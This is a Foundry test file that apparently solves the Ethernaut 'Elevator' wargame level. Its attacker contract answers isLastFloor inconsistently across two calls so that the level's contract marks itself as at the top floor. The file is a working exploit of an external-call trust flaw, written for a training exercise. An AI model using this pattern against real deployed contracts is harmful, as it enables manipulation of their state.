// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/11-Elevator/ElevatorFactory.sol";
import "../core/Ethernaut.sol";

contract ElevatorTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testElevatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create a contract that will inherint from Elevator
        // The goal is to change the state variable floor and top from Elevator contract
        // By implementing a isLastFloor function in the calling contract
        // it is possible to enter the if condition from goTo function from Elevator contract
        BuildingWithElevator buildingWithElevator = new BuildingWithElevator(ethernautElevator);
        buildingWithElevator.callElevator();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract BuildingWithElevator is Building {
    uint256 constant lastFloor = uint256(2);
    Elevator elevator;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256 floor) external view returns (bool) {
        return floor == elevator.floor();
    }

    function callElevator() external {
        elevator.goTo(lastFloor);
    }
}
